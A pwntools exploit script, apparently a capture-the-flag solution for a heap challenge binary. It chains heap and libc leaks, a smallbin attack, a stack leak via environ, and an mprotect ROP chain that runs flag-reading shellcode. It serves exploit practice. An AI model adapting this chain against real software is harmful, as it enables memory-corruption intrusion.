#!/usr/bin/env python3
# coding = utf-8
# Environment: Ubuntu 18.04

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice: int) -> None:
    p.recvuntil('> ')
    p.send(str(choice))

def buy(index: int, size: int, data: bytes) -> None:
    send_choice(1)
    p.recvuntil("Input the index:")
    p.send(str(index))
    p.recvuntil("input the size of basketball:")
    p.send(str(size))
    p.recvuntil("Input the dancer name:")
    p.send(data)

def throw(index: int) -> None:
    send_choice(2)
    p.recvuntil("Input the idx of basketball:")
    p.send(str(index))

def show(index: int) -> None:
    send_choice(3)
    p.recvuntil("Input the idx of basketball:")
    p.send(str(index))
    
def change(index: int, data: bytes) -> None:
    send_choice(4)
    p.recvuntil("Input the idx of basketball:")
    p.send(str(index))
    p.recvuntil("The new dance of the basketball:")
    p.send(data)

def secret(data: bytes) -> None:
    send_choice(5)
    p.recvuntil("Input the secret place:")
    p.send(data)

def backdoor() -> None:
    send_choice(1638)


p = process('./playthenew')
elf = ELF('./playthenew')
gdb.attach(p, '')

# Step 1: Leak heap address from `tcache->next` field
for _ in range(2):
    buy(0, 0x88, 'a')
    throw(0)
show(0)
p.recvuntil("Show the dance:")
heap_base = u64(p.recv(6).ljust(8, b'\x00')) & 0xffff_ffff_ffff_f000
log.info(f"heap base: {hex(heap_base)}")

# Step 2: Leak Libc address via unsortedbin leak
for _ in range(5):
    buy(0, 0x88, 'a')
    throw(0)
buy(0, 0x88, 'a')
buy(1, 0x88, 'a')
throw(0)
show(0)
p.recvuntil("Show the dance:")
__malloc_hook = u64(p.recv(6).ljust(8, b'\x00')) - 0x70
libc = LibcSearcher('__malloc_hook', __malloc_hook)
libc_base = __malloc_hook - libc.dump('__malloc_hook')
system = libc_base + libc.dump('system')
log.info(f"__malloc_hook: {hex(__malloc_hook)}")
log.info('libc base: ' + hex(libc_base))
log.info('system: ' + hex(system))
throw(1)

# Step 3: Construct and send 0x170 size chunks in smallbin & tcache for attacking
for _ in range(5):
    buy(0, 0x160, 'a')
    throw(0)
for _ in range(7):
    buy(0, 0xc0, 'a')
    throw(0)
    buy(0, 0x90, 'a')
    throw(0)
buy(0, 0x90, 'a')
buy(1, 0xc0, 'a')
buy(2, 0x100, 'a')  # Useless chunk, preventing from forward consolidation
buy(2, 0x90, 'a')
buy(3, 0xc0, 'a')
buy(4, 0x100, 'a')  # Useless chunk, preventing from forward consolidation
buy(4, 0x90, 'a')
throw(0)
throw(2)            # Note that two 0xa0 size chunk #0 & #2 in unsortedbin now
buy(0, 0xc0, 'a')
buy(2, 0x100, 'a')  # Useless chunk, preventing from forward consolidation (top chunk)
throw(1)            # Intend to consolidate with old chunk #0 to 0x170 size chunk
throw(3)            # Intend to consolidate with old chunk #2 to 0x170 size chunk
throw(4)            # Note that a new 0xa0 size chunk #4 in unsortedbin now
throw(0)            # Intend to consolidate with old chunk #2 to 0x170 size chunk
buy(0, 0x200, 'a')  # Useless chunk, triggering unsortedbin consolidation and bin movement

# Step 4: Perform smallbin attack: write libc address to 0x100000
change(4, p64(heap_base + 0x1a00) + p64(0x100000 - 0x10))
buy(1, 0x160, 'a')

# Step 5: Use backdoor to leak stack address
puts = libc.dump('puts') + libc_base
environ = libc.dump('environ') + libc_base
secret(p64(0) + p64(puts) + p64(environ))
backdoor()
leak_stack = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"leak stack: {hex(leak_stack)}")

# Step 6: Prepare shellcode, turn anonymous segment into RWX, execute shellcode
gets = libc.dump('gets') + libc_base
shellcode = shellcraft.amd64.linux.cat2('flag')
secret(p64(0) + p64(gets) + p64(leak_stack - 0x110) + asm(shellcode))
backdoor()

pop_rdi_ret = 0x000000000002164f + libc_base
pop_rsi_ret = 0x0000000000023a6a + libc_base
pop_rdx_ret = 0x0000000000001b96 + libc_base
mprotect = libc.dump('mprotect') + libc_base
# mprotect(0x100000, 0x1000, 7) -> shellcode(cat flag)
ROPcode =   p64(pop_rdi_ret) + p64(0x100000) + \
            p64(pop_rsi_ret) + p64(0x1000) + \
            p64(pop_rdx_ret) + p64(7) + \
            p64(mprotect) + \
            p64(0x100020)

p.sendline(ROPcode)
p.interactive()
